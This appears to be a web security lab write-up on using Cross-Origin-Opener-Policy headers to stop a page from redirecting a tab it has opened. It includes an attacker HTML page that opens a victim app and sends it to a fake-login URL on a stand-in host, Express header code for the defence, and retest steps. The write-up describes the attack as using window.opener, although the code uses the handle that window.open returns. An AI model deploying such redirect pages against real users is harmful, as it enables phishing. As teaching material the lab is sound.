# Challenge 8: Preventing Cross-Origin Exploitation via `window.opener`

## Objective
Implement Cross-Origin Opener Policy (COOP) headers to prevent cross-origin exploitation using the `window.opener` property.

---

## Attack Scenario

### Exploit Description
An attacker opens the victim application (`localhost:3000`) in a new tab using `window.open`. Without proper isolation, the attacker can use the `window.opener.location` property to redirect the victim application to a malicious page.

#### Malicious Page 
The attacker creates a malicious page that opens the victim application and redirects it:
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>evil-site.com</title>
    <script>
        function attackVictim() {
            const victim = window.open("http://localhost:3000", "_blank");

            // Redirect the victim application after it opens
            setTimeout(() => {
                victim.location = "http://evil-site.com/fake-login";
            }, 2000); // Wait for the victim page to load
        }
    </script>
</head>
<body>
    <h1>Evil Site</h1>
    <button onclick="attackVictim()">Launch Attack</button>
</body>
</html>
```
(see [`attacks/attack-xs-leak-coop.html`](./attacks/attack-xs-leak-coop.html))

---

### Steps to Reproduce
1. Open the malicious page in a browser.
2. Click the "Launch Attack" button:
   - The victim application (`http://localhost:3000`) will open in a new tab.
   - After 2 seconds, the attacker will use `window.opener.location` to redirect the victim application to `http://evil-site.com/fake-login`.

---

## Protection Steps

### Step 1: Add COOP Headers
The `Cross-Origin-Opener-Policy` header ensures the victim application operates in its own isolated browsing context, preventing `window.opener` from being accessed by the attacker.

#### Add COOP Header in `app.js`:
```javascript
app.use((req, res, next) => {
    res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
    res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
    next();
});

```

### Step 2: Retest the Attack
1. Reload the malicious page and click the "Launch Attack" button.
2. Verify that:
   - The attacker page can no longer manipulate or redirect the victim application.
   - An error appears in the attacker console indicating that `window.opener` is `null` or inaccessible:
     ```plaintext
     Uncaught DOMException: Permission denied to access property 'location' on cross-origin object
     ```

---

## Lessons Learned
1. **COOP Headers**:
   - `Cross-Origin-Opener-Policy: same-origin` isolates the victim application, preventing exploitation via `window.opener`.
   - `same-origin-allow-popups` can be used for backward compatibility during migration.

2. **`window.opener` Risks**:
   - The `window.opener` property allows a malicious page to manipulate or interact with the victim page unless explicitly blocked.
   - Always isolate sensitive applications with COOP.

3. **Defence-in-Depth**:
   - Combine COOP headers with other defences (e.g., CSP) to secure cross-origin interactions comprehensively.

4. **Proactive Design**:
   - Avoid reliance on `window.opener` in application design.
   - Include COOP headers during the development phase.

---

## Key Takeaways
- COOP prevents `window.opener` exploitation by isolating browsing contexts.
- Testing COOP implementation is critical to ensure workflows are not unintentionally broken.
- Use `same-origin-allow-popups` for incremental adoption in legacy applications.

---

## Further Resources
- [XSLeaks - Cross-Origin Opener Policy](https://xsleaks.dev/docs/defenses/opt-in/coop/)
- [Web.dev - Why COOP and COEP Are Important](https://web.dev/articles/why-coop-coep/)
- [Web.dev - Securely hosting user data in modern web applications ](https://web.dev/articles/securely-hosting-user-data)
- [MDN Web Dev - Cross-Origin-Opener-Policy]()https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
